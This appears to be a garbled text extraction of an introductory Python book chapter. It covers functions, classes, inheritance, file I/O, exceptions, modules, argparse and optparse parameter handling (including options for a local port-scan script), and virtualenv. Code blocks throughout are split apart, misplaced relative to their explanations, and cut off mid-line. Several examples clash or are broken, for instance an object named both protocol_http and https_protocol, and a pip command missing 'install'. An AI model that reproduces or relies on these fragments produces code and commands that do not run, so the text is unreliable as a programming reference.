lambda x,y : x * y, where lambda is a Python keyword and
x and y are the function parameters.
In Python, functions include reusable code-ordered blocks. This
allows a developer to write a block of code to perform a single
action. Although Python oﬀers several built-in features, a developer
may build user-deﬁned functionality.
Python functions are deﬁned using the def keyword with the
function name, followed by the function parameters. The function’s
body is composed of Python statements to be executed. You have the
option to return a value to the function caller at the end of the
function, or if you do not assign a return value, it will return the
None value by default.
For instance, we can deﬁne a function that returns True if the item
value is found in the dictionary and False otherwise. You can ﬁnd
the following code in the my_function.py ﬁle:
def contains(dictionary,item): 
    for key,value in dictionary.items(): 
        if value == item: 
            return True 
    return False  
dictionary = {1:100,2:200,3:300} 

print(contains(dictionary,200)) 
print(contains(dictionary,300)) 
print(contains(dictionary,350)) 
Two important factors make parameters special:
Parameters only exist within the functions in which they were
described, and the only place where the parameter can be
speciﬁed is in the space between a pair of parentheses in the
def state.
Assigning a value to the parameter is done at the time of the
function’s invocation by specifying the corresponding
argument.
Python classes
Python is an object-oriented language that allows you to create
classes from descriptions and instantiate them. The functions
speciﬁed inside the class are instance methods, also known as
member functions.
Python’s way of constructing objects is via the class keyword. A
Python object is an assembly of methods, variables, and properties.
Lots of objects can be generated with the same class description.
Here is a simple example of a protocol object deﬁnition.
You can ﬁnd the following code in the protocol.py ﬁle:
class Protocol(object): 
    def __init__(self, name, number,description): 

The init method is a special method that acts as a constructor
method to perform the necessary initialization operation. The
method’s ﬁrst parameter is a special keyword, and we use the self-
identiﬁer for the current object reference. The self keyword is a
reference to the object itself and provides a way for its aĴributes and
methods to access it.
The constructor method must provide the self
parameter and may have more parameters than just
self; if this happens, the way in which the class name
is used to create the object must reﬂect the __init__
deﬁnition. This method is used to set up the object, in
other words, to properly initialize its internal state.
This parameter is equivalent to the pointer that can be
found in languages such as C ++ or Java.
An object is a set of requirements and qualities assigned to a
speciﬁc class. Classes form a hierarchy, which means that an object
belonging to a speciﬁc class belongs to all the superclasses at the
same time.
To build an object, write the class name followed by any parameter
needed in parentheses. These are the parameters that will be
        self.name = name 
        self.number = number 
        self.description = description 
    def getProtocolInfo(self): 
        return self.name+ " "+str(self.number)+ " "+

transferred to the init method, which is the process that is called
when the class is instantiated:
Now that we have created our object, we can access its aĴributes and
methods through the object.attribute and object.method()
syntax:
>>> protocol_http.getProtocolInfo() 
HTTPS 443 Hypertext Transfer Protocol Secure 
In summary, object programming is the art of deﬁning and
expanding classes. A class is a model of a very speciﬁc part of reality,
reﬂecting properties and methods found in the real world. The new
class may add new properties and new methods, and therefore may
be more useful in speciﬁc applications.
Python inheritance
In the previous code, we can see a method with the name __init__,
which represents the class constructor. If a class has a constructor, it
is invoked automatically and implicitly when the object of the class
is instantiated. This method allows us to initialize the internal state
of an object when we create an object of a class.
Python inheritance is an important concept in object-oriented
programming languages. This feature means creating a new class
>>> https_protocol= Protocol("HTTPS", 443, "Hypertex

that inherits all the functionality of the parent class and allows the
new class to add additional functionality to the base functionality.
In object-oriented terminology, when class “X” is inherited by class
“Y”, “X” is called a Super Class or Base Class and “Y” is called a
Subclass or Derived Class. One more fact to keep in mind is that only
the ﬁelds and methods that are not private are accessible by the
Derived Class. Private ﬁelds and methods are only accessible by the
class itself.
Single inheritance occurs when a child class inherits the aĴributes
and methods of a single parent class. The following is an example of
simple inheritance in Python where we have a base class and a child
class that inherits from the parent class. Note the presence of the
__init__ method in both classes , which allows you to initialize the
properties of the class as an object constructor.
You can ﬁnd the following code in the Inheritance_simple.py
ﬁle.
class BaseClass: 
    def __init__(self, property): 
        self.property = property 
    def message(self): 
        print('Welcome to Base Class') 
    def message_base_class(self): 
        print('This is a message from Base Class') 
  
class ChildClass(BaseClass): 
    def __init__(self, property): 
        BaseClass.__init__(self, property) 

    def message(self): 
        print('Welcome to ChildClass') 
        print('This is inherited from BaseClass') 
In our main program we declare two objects, one of each class, and
we call the methods deﬁned in each of the classes. Also, taking
advantage of the inheritance features, we call the method of the
parent class using an object of the child class.
if __name__ == '__main__': 
    base_obj = BaseClass('property') 
    base_obj.message() 
    child_obj = ChildClass('property') 
    child_obj.message() 
    child_obj.message_base_class() 
Two built-in functions, isinstance() and issubclass(), are
used to check inheritances. One of the methods that we can use to
check if a class is a subclass of another is through the issubclass()
method. This method allows us to check if a subclass is a child of a
superclass and returns the Boolean True or False depending on the
result.
>>> print(issubclass(ChildClass, BaseClass)) 
>>> True
>>> print(issubclass(BaseClass, ChildClass)) 
>>> False

In the same way, the isinstance() method allows you to check if
an object is an instance of a class. This method returns True if the
object is the instance of the class that is passed as the second
parameter. The syntax of this special method is
isinstance(Object,Class).
>>> print(isinstance(base_obj, BaseClass)) 
>>> True
>>> print(isinstance(child_obj, ChildClass)) 
>>> True
>>> print(isinstance(child_obj, BaseClass)) 
>>> True
Multiple inheritance occurs when a child class inherits aĴributes and
methods from more than one parent class. We could separate both
main classes with a comma when creating the secondary class. In the
following example we are implementing multiple inheritance where
the child class is inheriting from the MainClass and MainClass2
classes.
You can ﬁnd the following code in the Inheritance_multiple.py
ﬁle.
class MainClass: 
    def message_main(self): 
        print('Welcome to Main Class') 
class MainClass2: 
    def message_main2(self): 
        print('Welcome to Main Class2') 

Our main program creates an object of the Child class, on which
we could access both methods of the parent classes.
if __name__ == '__main__': 
    child_obj = ChildClass() 
    child_obj.message() 
    child_obj.message_main() 
    child_obj.message_main2() 
Python also supports multilevel inheritance, which allows the child
class to have inheritance below it. That means the base class is the
parent class of all sub-classes and inheritance goes from parent to
child. In this way, child classes can access properties and methods
from parent classes, but parent classes cannot access the properties
of the child class.
In the following example we are implementing multilevel
inheritance where the child class is inheriting from the MainClass
and we add another level of inheritance with the ChildDerived
class, which is inheriting from the Child class. You can ﬁnd the
following code in the Inheritance_multilevel.py ﬁle.
class MainClass: 
    def message_main(self): 
class ChildClass(MainClass,MainClass2): 
    def message(self): 
        print('Welcome to ChildClass') 
        print('This is inherited from MainClass and 

        print('Welcome to Main Class') 
class Child(MainClass): 
    def message_child(self): 
        print('Welcome to Child Class') 
        print('This is inherited from Main') 
class ChildDerived(Child): 
    def message_derived(self): 
        print('Welcome to Derived Class') 
        print('This is inherited from Child') 
In the previous code we ﬁrst create a main class and then create a
child class that is inherited from Main and create another class
derived from the child class. We see how the child_derived_obj
object is an instance of each of the classes that are part of the
hierarchy. In multilevel inheritance, the features of the base class and
the derived class are inherited into the new derived class. In our
main program we declare a child-derived object and we call the
methods deﬁned in each of the classes.
if __name__ == '__main__': 
    child_derived_obj = ChildDerived() 
    child_derived_obj.message_main() 
    child_derived_obj.message_child() 
    child_derived_obj.message_derived() 
    print(issubclass(ChildDerived, Child)) 
    print(issubclass(ChildDerived, MainClass)) 
    print(issubclass(Child, MainClass)) 
    print(issubclass(MainClass, ChildDerived)) 
    print(isinstance(child_derived_obj, Child)) 

When executing the previous script, we see how from the
ChildDerived class we can call the methods from the Child and
Main classes. Also, with the issubclass() and isinstance()
methods we can check whether the child_derived_obj object is a
subclass and instance of the higher classes within the management
hierarchy.
Advantages of Python inheritance
One of the main advantages is code reuse, allowing us to establish a
relationship between classes, avoiding the need to re-declare certain
methods or aĴributes.
Classes allow us to build objects on top of a collection of abstractly
deﬁned aĴributes and methods. And the ability to inherit will allow
us to create larger and more capable child classes by inheriting
multiple aĴributes and methods from others as well as more speciﬁc
controlling the same for a single class.
The following are some beneﬁts of using inheritance in Python’s
object-oriented programming:
Python inheritance provides code reusability, readability, and
scalability.
Reduce code repetition. You can deﬁne all the methods and
aĴributes in the parent class that are accessible by the child
classes.
    print(isinstance(child_derived_obj, MainClass)) 
    print(isinstance(child_derived_obj, ChildDerived

By dividing the code into multiple classes, identifying bugs in
applications is easier.
Working with files in Python
When working with ﬁles it is important to be able to move through
the ﬁlesystem, determine the type of ﬁle, and open a ﬁle in the
diﬀerent modes oﬀered by the operating system.
Reading and writing files in Python
Now we are going to review the methods for reading and writing
ﬁles. These are the methods we can use on a ﬁle object for diﬀerent
operations:
file.open(name_file,mode): Opens a ﬁle with a speciﬁc
mode.
file.write(string): Writes a string in a ﬁle.
file.read([bufsize]): Reads up to bufsize, the number of
bytes from the ﬁle. If run without the buﬀer size option, it will
read the entire ﬁle.
file.readline([bufsize]): Reads one line from the ﬁle.
file.close(): Closes the ﬁle and destroys the file object.
The open() function is usually used with two parameters (the ﬁle
with which we are going to work and the access mode) and it
returns a file-type object. When opening a ﬁle with a certain access
mode with the open() function, a file object is returned.

The opening modes can be r (read), w (write), and a (append). We
can combine the previous modes with others depending on the ﬁle
type. We can also use the b (binary), t (text), and + (open reading
and writing) modes. For example, you can add a + to your option,
which allows read/write operations with the same object:
>>> f = open("file.txt","w") 
>>> type(f) 
<class '_io.TextIOWrapper'> 
>>> f.close() 
The following properties of the ﬁle object can be accessed:
closed: Returns True if the ﬁle has been closed. Otherwise,
False.
mode: Returns the opening mode.
name: Returns the name of the ﬁle
encoding: Returns the character encoding of a text ﬁle
In the following example, we are using these properties to get
information about the ﬁle.
You can ﬁnd the following code in the read_file_properties.py
ﬁle.
file_descryptor = open("read_file_properties.py", "r
print("Content: "+file_descryptor.read()) 
print("Name: "+file_descryptor.name) 
print("Mode: "+file_descryptor.mode) 

When reading a ﬁle, the readlines() method reads all the lines of
the ﬁle and joins them in a list sequence. This method is very useful
if you want to read the entire ﬁle at once:
>>> allLines = file.readlines() 
The alternative is to read the ﬁle line by line, for which we can use
the readline() method. In this way, we can use the file object as
an iterator if we want to read all the lines of a ﬁle one by one:
>>> with open("file.txt","r") as file: 
...    for line in file: 
...        print(line) 
In the following example, we are using the readlines() method to
process the ﬁle and get counts of the lines and characters in this ﬁle.
You can ﬁnd the following code in the count_lines_chars.py ﬁle.
try: 
    countlines = countchars = 0 
    file = open('count_lines_chars.py', 'r') 
    lines = file.readlines() 
    for line in lines: 
        countlines += 1 
        for char in line: 
print("Encoding: "+str(file_descryptor.encoding)) 
file_descryptor.close() 

            countchars += 1 
    file.close() 
    print("Characters in file:", countchars) 
    print("Lines in file:", countlines) 
except IOError as error: 
    print("I/O error occurred:", str(error)) 
If the ﬁle we are reading is not available in the same directory, then
it will throw an I/O exception with the following error message:
Writing text ﬁles is possible using the write() method and it
expects just one argument that represents a string that will be
transferred to an open ﬁle. You can ﬁnd the following code in the
write_lines.py ﬁle:
In the previous code, we can see how a new ﬁle called newfile.txt
is created. The open mode wt means that the ﬁle is created in write
mode and text format.
I/O error occurred: [Errno 2] No such file or direct
try: 
    myfile = open('newfile.txt', 'wt')  
    for i in range(10): 
        myfile.write("line #" + str(i+1) + "\n") 
    myfile.close() 
except IOError as error: 
    print("I/O error occurred: ", str(error.errno)) 

There are multiple ways to open and create ﬁles in Python, but the
safest way is by using the with keyword, in which case we are using
the Context Manager approach. When we are using the open
statement, Python delegates to the developer the responsibility for
closing the ﬁle, and this practice can provoke errors since developers
sometimes forget to close it.
Developers can use the with statement to handle this situation in a
safely way. The with statement automatically closes the ﬁle even if
an exception is raised. Using this approach, we have the advantage
that the ﬁle is closed automatically, and we don’t need to call the
close() method.
You can ﬁnd the following code in the creating_file.py ﬁle:
def main(): 
        with open('test.txt', 'w') as file: 
                file.write("this is a test file") 
if __name__ == '__main__': 
        main() 
The previous code uses the context manager to open a ﬁle and
returns the ﬁle as an object. We then call file.write("this is a
test file"), which writes it into the created ﬁle. The with
statement then handles closing the ﬁle for us in this case, so we don’t
have to think about it.
IMPORTANT NOTE

For more information about the with statement, you
can check out the oﬃcial documentation at
https://docs.python.org/3/reference/compound
_stmts.html#the-with-statement.
At this point we have reviewed the section on working with ﬁles in
Python. The main advantage of using these methods is that they
provide an easy way by which you can automate the process of
managing ﬁles in the operating system.
In the next section, we’ll review how to manage exceptions in Python
scripts. We’ll review the main exceptions we can ﬁnd in Python for
inclusion in our scripts.
Learn and understand exceptions
management in Python
Each time your code executes in an unintended way Python stops
your program, and it creates a special kind of data, called an
exception. An exception or runtime error occurs during program
execution. Exceptions are errors that Python detects during
execution of the program. If the interpreter experiences an unusual
circumstance, such as aĴempting to divide a number by 0 or
aĴempting to access a ﬁle that does not exist, an exception is created
or thrown, telling the user that there is a problem.
When an exception is not handled correctly, the execution ﬂow is
interrupted, and the console shows the information associated with
the exception so that the reader can solve the problem with the

information returned by the exception. Exceptions can be handled so
that the program does not terminate.
Let’s look at some examples of exceptions:
In the previous examples, we can see the exception traceback,
which consists of a list of the calls that caused the exception. As we
see in the stack trace, the error was caused by executing an operation
that is not permiĴed in Python.
IMPORTANT NOTE
Python provides eﬀective methods that allow you to
observe exceptions, identify them, and handle them
eﬃciently. This is possible since all potential
exceptions have their unambiguous names, so you can
categorize them and react appropriately. We will
>>> 4/0 
Traceback (most recent call last): 
  File "<stdin>", line 1, in <module> 
ZeroDivisionError: division by zero 
>>> a+4 
Traceback (most recent call last): 
  File "<stdin>", line 1, in <module> 
NameError: name 'a' is not defined 
>>> "4"+4 
Traceback (most recent call last): 
  File "<stdin>", line 1, in <module> 
TypeError: Can't convert 'int' object to str implici

review some tools in the Development environments for
Python scripting section with some interesting
techniques such as debugging.
In Python, we can use a try/except block to resolve situations
related to exception handling. Now, the program tries to run the
division by zero. When the error happens, the exceptions manager
captures the error and prints a message that is relevant to the
exception:
>>> try: 
...     print("10/0=",str(10/0)) 
... except Exception as exception: 
...     print("Error =",str(exception)) 
...  
Error = division by zero 
The try keyword begins a block of the code that may or may not be
performing correctly. Next, Python tries to perform some operations;
if it fails, an exception is raised, and Python starts to look for a
solution.
At this point, the except keyword starts a piece of code that will be
executed if anything inside the try block goes wrong – if an
exception is raised inside a previous try block, it will fail here, so
the code located after the except keyword should provide an
adequate reaction to the raised exception. The following code raises
an exception related to accessing an element that does not exist in
the list:

>>> try: 
...     list=[] 
...     element=list[0] 
... except Exception as exception: 
...     print("Exception=",str(exception)) 
...  
Exception= list index out of range 
In the previous code the exception is produced when trying to access
the ﬁrst element of an empty list.
In the following example, we join all these functionalities with
exception management when we are working with ﬁles. If the ﬁle is
not found in the ﬁlesystem, an exception of the IOError type is
thrown, which we can capture thanks to our try..except block.
You can ﬁnd the following code in the read_file_exception.py
ﬁle:
try: 
    file_handle = open("myfile.txt", "r") 
except IOError as exception: 
    print("Exception IOError: Unable to read from my
except Exception as exception: 
    print("Exception: ", exception) 
else: 
    print("File read successfully") 
    file_handle.close() 

In the preceding code, we manage an exception when opening a ﬁle
in read mode and if the ﬁle does not exist it will throw the message
"Exception IOError: Unable to read from myfile [Errno
2] No such file or directory: 'myfile.txt'".
Python 3 deﬁnes 63 built-in exceptions, and all of them form a tree-
shaped hierarchy. Some of the built-in exceptions are more general
(they include other exceptions), while others are completely
concrete. We can say that the closer to the root an exception is
located, the more general (abstract) it is.
Some of the exceptions available by default are listed here (the class
from which they are derived is in parentheses):
BaseException: The class from which all exceptions inherit.
Exception (BaseException): An exception is a special case
of a more general class named BaseException.
ZeroDivisionError (ArithmeticError): An exception
raised when the second argument of a division is 0. This is a
special case of a more general exception class named
ArithmeticError.
EnvironmentError (StandardError): This is a parent class of
errors related to input/output.
IOError (EnvironmentError): This is an error in an
input/output operation.
OSError (EnvironmentError): This is an error in a system
call.
ImportError (StandardError): The module or the module
element that you wanted to import was not found.

All the built-in Python exceptions form a hierarchy of classes. The
following script dumps all predeﬁned exception classes in the form
of a tree-like printout.
You can ﬁnd the following code in the get_exceptions_tree.py
ﬁle:
As a tree is a perfect example of a recursive data structure, a
recursion seems to be the best tool to traverse through it. The
printExceptionsTree() function takes two arguments:
A point inside the tree from which we start traversing the tree
A level to build a simpliﬁed drawing of the tree’s branches
This could be a partial output of the previous script:
BaseException 
     +---Exception 
     |     +---TypeError 
     |     +---StopAsyncIteration 
def printExceptionsTree(ExceptionClass, level = 0): 
    if level > 1: 
        print("   |" * (level - 1), end="") 
    if level > 0: 
        print("   +---", end="") 
    print(ExceptionClass.__name__) 
    for subclass in ExceptionClass.__subclasses__()
        printExceptionsTree(subclass, level+1) 
printExceptionsTree(BaseException) 

     |     +---StopIteration 
     |     +---ImportError 
     |     |     +---ModuleNotFoundError 
     |     |     +---ZipImportError 
     |     +---OSError 
     |     |     +---ConnectionError 
     |     |     |     +---BrokenPipeError 
     |     |     |     +---ConnectionAbortedError 
     |     |     |     +---ConnectionRefusedError 
     |     |     |     +---ConnectionResetError 
     |     |     +---BlockingIOError 
     |     |     +---ChildProcessError 
     |     |     +---FileExistsError 
     |     |     +---FileNotFoundError 
     |     |     +---IsADirectoryError 
     |     |     +---NotADirectoryError 
     |     |     +---InterruptedError 
     |     |     +---PermissionError 
     |     |     +---ProcessLookupError 
     |     |     +---TimeoutError 
     |     |     +---UnsupportedOperation 
     |     |     +---herror 
     |     |     +---gaierror 
     |     |     +---timeout 
     |     |     +---Error 
     |     |     |     +---SameFileError 
     |     |     +---SpecialFileError 
     |     |     +---ExecError 
     |     |     +---ReadError 

In the output of the previous script, we can see the root of Python’s
exception classes is the BaseException class (this is a superclass of
all the other exceptions). For each of the encountered classes, it
performs the following set of operations:
Print its name, taken from the __name__ property.
Iterate through the list of subclasses delivered by the
__subclasses__() method, an recursively invoke the
printExceptionsTree() function, incrementing the nesting
level, respectively.
Now that you know the functions, classes, objects and exceptions for
working with Python, let’s move on to learning how to manage
modules and packages. Also, we will review the use of some
modules for managing parameters, including argparse and
optarse.
Python modules and packages
In this section, you will learn how Python provides modules that are
built in an extensible way and oﬀers the possibility to developers to
create their own modules.
What is a module in Python?
A module is a collection of functions, classes, and variables that we
can use for implementing and application. There is a large collection
of modules available with the standard Python distribution.
Modules have a dual purpose among which we can highlight:

Break a program with many lines of code into smaller parts.
Extract a set of deﬁnitions that you use frequently in your
programs to be reused. This prevents, for example, having to
copy functions from one program to another.
A module can be speciﬁed as a ﬁle containing deﬁnitions and
declarations from Python. The ﬁle must have a .py extension and its
name corresponds to the name of the module. We can start by
deﬁning a simple module in a .py ﬁle. We’ll deﬁne a simple
message(name) function inside the my_functions.py ﬁle that will
print "Hi,{name}.This is my first module".
You can ﬁnd the following code in the my_functions.py ﬁle inside
the first_module folder:
def message(name): 
    print(f"Hi {name}.This is my first module") 
Within our main.py ﬁle, we can then import this ﬁle as a module
and use the message(name) method. You can ﬁnd the following
code in the main.py ﬁle:
import my_functions 
def main(): 
    my_functions.message("Python") 
if __name__ == '__main__': 
    main() 

When a module is imported, its content is implicitly executed by
Python. You already know that a module can contain instructions
and deﬁnitions. Usually, the statements are used to initialize the
module and are only executed the ﬁrst time the module name
appears in an import statement.
That’s all we need in order to deﬁne a very simple Python module
within our Python scripts.
How to import modules in Python
To use the deﬁnitions of a module in the interpreter or in another
module, you must ﬁrst import it. To do this, the import keyword is
used. Once a module has been imported, its deﬁnitions can be
accessed via the dot . operator.
We can import one or several names of a module as follows. This
allows us to directly access the names deﬁned in the module without
having to use the dot . operator.
>>> from my_functions import message 
>>> message('python') 
We can also use the * operator to import all the functions of the
module.
>>> from my_functions import * 
>>> message('python') 

Accessing any element of the imported module is done through the
namespace, followed by a dot (.) and the name of the element to be
obtained. In Python, a namespace is the name that has been
indicated after the word import, that is, the path (namespace) of the
module.
It is also possible to abbreviate namespaces by means of an alias. To
do this, during the import, the keyword as is assigned followed by
the alias with which we will refer to that imported namespace in the
future. In this way, we can redeﬁne the name that will be used
within a module using the as reserved word:
Getting information from modules
We can get more information about methods and other entities from
a speciﬁc module using the dir() method. This method returns a
list with all the deﬁnitions (variables, functions, classes, …)
contained in a module. For example, if we execute this method using
the my_functions module we created earlier, we will get the
following result:
>>> from my_functions import message as my_message  
>>> my_message('python') 
Hi python. This is my first module 
>>> dir(my_functions) 
['__builtins__', '__cached__', '__doc__', '__file__

The dir() method returns an alphabetically sorted list containing
all entities’ names available in the module identiﬁed by any name
passed to the function as an argument. For example, you can run the
following code to print the names of all entities within the sys
module. We can obtain the list of built - in modules with the
following instructions:
The other modules that we can import are saved in ﬁles, which are in
the paths indicated in the interpreter:
In the previous code, we are using the dir() method to get all name
entities from the sys module.
Difference between a Python module
and a Python package
In the same way that we group functions and other deﬁnitions into
modules, Python packages allow you to organize and structure the
>>> import sys 
>>> sys.builtin_module_names 
('_abc', '_ast', '_codecs', '_collections', '_functo
>>> dir(sys) 
['__breakpointhook__', '__displayhook__', '__doc__',
>>> sys.path 
['', '/usr/lib/python3.4', '/usr/lib/python3.4/plat-

diﬀerent modules that make up a program in a hierarchical way.
Also, packages make it possible for multiple modules with the same
name to exist and not cause errors.
A package is simply a directory that contains other packages and
modules. Also, in Python, for a directory to be considered a package,
it must include a module called __init__.py. In most cases, this
ﬁle will be empty; however, it can be used to initialize package-
related code. Among the main diﬀerences between a module and a
package, we can highlight the following:
Module: Each of the .py ﬁles that we create is called a module.
The elements created in a module (functions, classes, …) can be
imported to be used in another module. The name we are going
to use to import a module is the name of the ﬁle.
Package: A package is a folder that contains .py ﬁles and
contains a ﬁle called __init__.py. This ﬁle does not need to
contain any instructions. The packages, at the same time, can
also contain other sub-packages.
Managing parameters in Python
Often in Python, scripts that are used on the command line as
arguments are used to give users options when they run a certain
command. To develop this task, one of the options is to use the
argparse module, which comes installed by default when you
install Python.
One of the interesting choices is that the type of parameter can be
indicated using the type aĴribute. For example, if we want to treat a

certain parameter as if it were an integer, then we might do so as
follows:
Another thing that could help us to have a more readable code is to
declare a class that acts as a global object for the parameters. For
example, if we wanted to pass several parameters at the same time to
a function, we could use the above mentioned global object, which is
the one that contains the global execution parameters.
You can ﬁnd the following code in the
params_global_argparse.py ﬁle:
parser.add_argument("-param", dest="param", type="in
import argparse 
class Parameters: 
    """Global parameters""" 
    def __init__(self, **kwargs): 
        self.param1 = kwargs.get("param1") 
        self.param2 = kwargs.get("param2") 
def view_parameters(input_parameters): 
    print(input_parameters.param1) 
    print(input_parameters.param2) 
parser = argparse.ArgumentParser(description='Testin
parser.add_argument("-p1", dest="param1", help="para
parser.add_argument("-p2", dest="param2", help="para
params = parser.parse_args() 
input_parameters = Parameters(param1=params.param1,p
view_parameters(input_parameters) 

In the previous script, we are using the argparse module to obtain
parameters and we encapsulate these parameters in an object with
the Parameters class.
For more information, you can check out the oﬃcial website:
https://docs.python.org/3/library/argparse.html.
In the following example, we are using the argparse module to
manage those parameters that we could use to perform a port scan,
such as the IP address, ports, and verbosity level. You can ﬁnd the
following code in the params_port_scanning.py ﬁle:
import argparse 
if __name__ == "__main__": 
    description = """ Uses cases:
        +  Basic scan:
            -target 127.0.0.1
        + Specific port:
            -target 127.0.0.1 -port 21
        + Port list:
            -target 127.0.0.1 -port 21,22
        + Only show open ports
            -target 127.0.0.1 --open True """ 
    parser = argparse.ArgumentParser(description='Po
                                     formatter_class
    parser.add_argument("-target", metavar='TARGET',
    parser.add_argument("-ports", dest="ports",  
                        help="Please, specify the ta
                        default = "80,8080") 
    parser.add_argument('-v', dest='verbosity', defa

Having set the necessary parameters using the add_argument()
method, we could then access the values of these arguments using
the parser module’s parse_args() method. Later, we could access
the parameters using the params variable.
    params = parser.parse_args() 
    print("Target:" + params.target) 
    print("Verbosity:" + str(params.verbosity)) 
    print("Only open:" + str(params.only_open)) 
    portlist = params.ports.split(',') 
    for port in portlist: 
        print("Port:" + port) 
Running the script above with the -h option shows the arguments it
accepts and some execution use cases.
                        help="verbosity level: -v, -
    parser.add_argument("--open", dest="only_open", 
                        help="only display open port
$ python params_port_scanning.py -h 
usage: params_port_scan_complete.py [-h] -target TAR
Port scanning 
optional arguments: 
  -h, --help      show this help message and exit 
  -target TARGET  target to scan 
  -ports PORTS    Please, specify the target port(s)
  -v              verbosity level: -v, -vv, -vvv. 
  --open          only display open ports 

When running the above script without any parameters, we get an
error message stating the target argument is required.
When running the above script with the target argument, we get
default values for the rest of parameters. For example, default values
are 0 for verbosity and 80 and 8080 for ports.
Uses cases: 
        +  Basic scan: 
             -target 127.0.0.1 
        + Specific port: 
             -target 127.0.0.1 -port 21 
        + Port list: 
             -target 127.0.0.1 -port 21,22 
        + Only show open ports 
             -target 127.0.0.1 --open True 
$ python params_port_scanning.py 
usage: params_port_scanning.py [-h] -target TARGET 
params_port_scanning.py: error: the following argume
$ python params_port_scanning.py -target localhost 
Params:Namespace(only_open=False, ports='80,8080', t
Target:localhost 
Verbosity:0 
Only open:False 
Port:80 
Port:8080 

When running the above script with the target, ports, and
verbosity arguments, we get new values for these parameters.
Managing parameters with
OptionParser
Python provides a class called OptionParser for managing
command-line arguments. OptionParser is part of the optparse
module, which is provided by the standard library. OptionParser
allows you to do a range of very useful things with command-line
arguments:
Specify a default if a certain argument is not provided.
It supports both argument ﬂags (either present or not) and
arguments with values.
It supports diﬀerent formats of passing arguments.
Let’s use OptionParser to manage parameters in the same way we
have seen before with the argparse module. In the code provided
here, command-line arguments are used to pass in variables.
$ python params_port_scanning.py -target localhost -
Params:Namespace(only_open=False, ports='22,23', tar
Target:localhost 
Verbosity:2 
Only open:False 
Port:22 
Port:23 

You can ﬁnd the following code in the
params_global_optparser.py ﬁle:
The previous script demonstrates the use of the OptionParser
class. It provides a simple interface for command-line arguments,
allowing you to deﬁne certain properties for each command-line
option. It also allows you to specify default values. If certain
arguments are not provided, it allows you to throw speciﬁc errors.
For more information, you can check out the oﬃcial website:
https://docs.python.org/3/library/optparse.html.
from optparse import OptionParser 
class Parameters: 
    """Global parameters""" 
    def __init__(self, **kwargs): 
        self.param1 = kwargs.get("param1") 
        self.param2 = kwargs.get("param2") 
  
def view_parameters(input_parameters): 
    print(input_parameters.param1) 
    print(input_parameters.param2) 
parser = OptionParser() 
parser.add_option("--p1", dest="param1", help="param
parser.add_option("--p2", dest="param2", help="param
(options, args) = parser.parse_args() 
input_parameters = Parameters(param1=options.param1,
view_parameters(input_parameters) 

Now that you know how Python manages modules and packages,
let’s move on to learning how to manage dependencies and create a
virtual environment with the virtualenv utility.
Managing dependencies and virtual
environments
In this section, you will be able to identify how to manage
dependencies and the execution environment with pip and
virtualenv.
Managing dependencies in a Python
project
If our project has dependencies with other libraries, the goal will be
to have a ﬁle where we have such dependencies, so that our module
is built and distributed as quickly as possible. For this function, we
can create a ﬁle called requirements.txt, which contains all the
dependencies the module requires.
To install all the dependencies, we can use the following command
with the pip utility:
$ pip -r requirements.txt 
Here, pip is the Python package and dependency manager and
requirements.txt is the ﬁle where all the dependencies of the
project are saved.

TIP
Within the Python ecosystem, we can ﬁnd new
projects to manage the dependencies and packages of
a Python project. For example, poetry
(https://python-poetry.org) is a tool for handling
dependency installation as well as building and
packaging Python packages.
Install Python modules
Python has an active community of developers and users who
develop both standard Python modules, as well as modules and
packages developed by third parties. The Python Package Index, or
PyPI (https://pypi.org), is the oﬃcial software package
repository for third-party applications in the Python programming
language.
To install a new python Package, you have the following
alternatives:
Use the one that is packaged depending on the operating
system and distribution you are using. For example, using apt-
cache show <package>
Install pip on your computer and, as a superuser, install the
Python package that interests us. This solution can give us
many problems, since we can break the dependencies between
the versions of our Python packages installed on the system and
some package may stop working.

Use virtual environments: It is a mechanism that allows you to
manage Python programs and packages without having
administration permissions, that is, any user without privileges
can have one or more “isolated spaces” where they can install
diﬀerent versions of Python programs and packages. To create
the virtual environments, we can use the virtualenv program
or the venv module.
Generating the requirements.txt file
We also have the ability to create the requirements.txt ﬁle from
the project source code. For this task, we can use the pipreqs
module, whose code can be downloaded from the GitHub repository
at https://github.com/bndr/pipreqs.
In this way, the module can be installed either with the pip
install pipreqs command or through the GitHub code repository
using the python setup.py install command.
For more information about the module, you can refer to the oﬃcial
PyPI page https://pypi.org/project/pipreqs/.
To generate the requirements.txt ﬁle, you could execute the
following command:
$ pipreqs <path_project> 
Working with virtual environments

When operating with Python, it’s strongly recommended that you
use virtual environments. A virtual environment provides a
separate environment for installing Python modules and an isolated
copy of the Python executable ﬁle and associated ﬁles.
You can have as many virtual environments as you need, which
means that you can have multiple module conﬁgurations
conﬁgured, and you can easily switch between them.
Configuring virtualenv
When you install a Python module on your local computer without
having to use a virtual environment, you install it on the operating
system globally. Typically, this installation requires a user root
administrator, and the Python module is conﬁgured for each user
and project.
The best approach at this point is to create a Python virtual
environment if you need to work on many Python projects, or if you
are working with several projects that are sharing some modules.
virtualenv is a Python module that enables you to build isolated,
virtual environments. Essentially, you must create a folder that
contains all the executable ﬁles and modules needed for a project.
You can install virtualenv as follows:
1. Type in the following command:
$ sudo pip install virtualenv 

2. To create a new virtual environment, create a new folder and
enter the folder from the command line:
$ cd your_new_folder 
$ virtualenv name-of-virtual-environment 
$ source bin/activate 
3. Once it is active, you will have a clean environment of modules
and libraries, and you will have to download the dependencies
of the project so that they are copied in this directory using the
following command:
(venv) > pip install -r requirements.txt 
Executing this command will initiate a folder with the name
indicated in your current working directory with all the
executable ﬁles of Python and the pip module, which allows
you to install diﬀerent packages in your virtual environment.
IMPORTANT NOTE
If you are working with Python 3.3+, virtualenv
is included in stdlib. You can get an installation
update for virtualenv in the Python
documentation:
https://docs.python.org/3/library/venv.h
tml.

4. virtualenv is like a sandbox where all the dependencies of the
project will be installed when you are working, and all modules
and dependencies are kept separate. If users have the same
version of Python installed on their machine, the same code will
work in the virtual environment without requiring any changes.
Now that you know how to install your own virtual environment,
let’s move on to review development environments for Python
scripting, including Python IDLE and PyCharm.
Development environments for
Python scripting
In this section, we will review PyCharm and Python IDLE as
development environments for Python scripting.
Setting up a development
environment
In order to rapidly develop and debug Python applications, it is
necessary to use an Integrated Development Environment (IDE). If
you want to try diﬀerent options, we recommend you check out the
list that is on the oﬃcial Python site, where you can see the tools
according to your operating systems and needs:
https://wiki.python.org/moin/IntegratedDevelopmentEnvir
onments
Out of all the environments, the following two are the ones we will
look at:

Python IDLE:
https://docs.python.org/3/library/idle.html
PyCharm: http://www.jetbrains.com/pycharm
Debugging with Python IDLE
Python IDLE is the default IDE that is installed when you install
Python in your operating system. Python IDLE allows you to debug
your script and see errors and exceptions in the Python shell console:
